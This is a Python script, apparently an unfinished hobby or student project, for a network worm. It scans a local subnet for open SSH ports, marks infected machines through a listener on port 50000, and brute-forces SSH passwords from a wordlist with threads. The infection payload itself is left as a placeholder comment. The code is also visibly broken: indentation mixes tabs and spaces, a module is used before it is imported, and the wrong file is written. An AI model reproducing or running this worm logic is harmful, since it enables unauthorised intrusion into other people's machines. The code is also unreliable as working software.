#! /usr/bin/env python3
	
from threading import Thread
import socket
import time

#function called when dictionary attack found a password
def passwordFoundCallback(password, sharedO):
    sharedO.setFound(password)
    print ("Found Password for host: " + sharedO.getHost() + " password: " + sharedO.getPassword())

class sharedThings():
    def __init__(self, host):
        self.threadCound = 0
        self.found = False
		self.password = ""
		self.host = host
    def incthreadCount(self):
        self.threadCound += 1
    def decthreadCount(self):
        self.threadCound -= 1
    def getthreadCount(self):
        return self.threadCound
    def setFound(self, password):
        self.found = True
		self.password = password
    def isFound(self):
        return self.found
	def getPassword(self):
		return self.password
	def getHost(self):
		return self.host

class BruteForceTask(Thread):
    def __init__(self, host, password, sharedO):
        Thread.__init__(self)

		self.host = host
		self.password = password
		self.sharedO = sharedO


    def run(self):
        try:
			tempPassFileScript = self.password + ".pass"
            f = open(self.password, "w+")
            f.write("echo " + tempPassFileScript)
            f.close()
            subprocess.check_output(["chmod", "+x", tempPassFileScript])
            time.sleep(0.1)
            print ("trying with password: " + self.password)
            subprocess.check_output(["./ssh_session.sh", tempPassFileScript, self.host])
            passwordFoundCallback(self.password, self.sharedO)
        except:
			pass
			#different errors should be handled differently
			#example of potential error:
			#							- Permission denied (nothing to do here, this is normal. Bad username/password Combination)
			#							- Connection closed (too many requests. We should try the password again and reduce the debit)
			#							- Connection refused (the port isnt open)
			#							- Other errors (the host isnt found and stuff)
		finally:
			subprocess.check_output(["rm", tempPassFileScript])
			self.sharedO.decthreadCount()

class SocketListener(Thread):

	def __init__(self):
		Thread.__init__(self)
		self.continueToListen = True
		
	def run(self):
		#create an INET, STREAMing socket
		serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#bind the socket to a public host and a port
		serverSocket.bind((socket.gethostname(), 50000))
		#become a server socket, 5 is the number of maximum connections that we can have at the same time
		serverSocket.listen(5)
		
		while self.continueToListen:
			#we just received a new connection. This line will block until we receive a new connection.
			conn, addr = serverSocket.accept()
			
			#we already infected the computer. Sending OK to the computer that made the connection to let him know that we infected the computer, so that he won't try to infect us
			conn.sendall('OK'.encode('utf-8'))
			conn.close()
			
	def	stopListening(self):
		self.continueToListen = False

#Step one: Open a socket, to let other computers know that this computer is infected.
socketThread = SocketListener()
socketThread.start()

#Step two: Scan the network for other computers to infect
import subprocess

print([(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1])
#HARDCODED - through ifconfig, need to figure out local adress/mask
nmapOutput = subprocess.check_output(["nmap", "-p", "22", "-oG", "-", "192.168.0.*"])
nmapOutput = nmapOutput.decode("utf-8")
listedNmapString = list(filter(lambda x: "open" in x, nmapOutput.splitlines()))

del listedNmapString[0]

for entry in listedNmapString:
	ip = entry.split()[1]
	host = ip
	dataDecoded = None
	errorOccured = False

	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socketClient:
			socketClient.connect((host, 50000))
			socketClient.sendall('I'.encode('utf-8'))
			data = socketClient.recv(1024)
			dataDecoded = data.decode('utf-8')
	except:
		errorOccured = True

	threadLimit = 8 #this is experimentally the highest ive reached without getting connection closed error
	sharedO = sharedThings(host) #used to mimic static variable. Used by processes to notice that they found a password
							     #need an instance of sharedThings per attacked Host
	#TODO: ssh root login is disabled on PIONE; Couldnt test PITWO since i cant find it
	#TODO: the scan is currently broken. FIX IT!
	if not errorOccured and dataDecoded == 'OK':
		print('ErreurOccured = false, dataDecoded = OK')
		print('Machine already infected. Passing to the next one...')
		continue


	print('Found a possible computer to infect. Trying to bruteforce the machine...')
	# we could parallelize each attack on hosts
	# the bottleneck of the technique seems to be the time it takes to receive the answer from the attacked host
	with open("./passwords.txt") as f:
		for line in f:
			t = BruteForceTask(host, line, sharedO)
			t.start()
			time.sleep(0.3)  # this is experimentally the fastest ive reached without getting connection closed error; may be different value for different hosts
			sharedO.incthreadCount()
			while threadLimit < sharedO.getthreadCount():
				time.sleep(1)
			if sharedO.isFound():
				break
	if sharedO.found:
		password = sharedO.password
		print('Infecting the machine...')
		# Infect the machine here

try:
	onSenCaliss = input('Appuyez sur nimporte quel touche pour Quitter (DEBUGGING PURPOSES, A ENLEVER)')
except:
	pass
finally:
	from sys import exit
	socketThread.stopListening()
	exit(0) # Successful exit
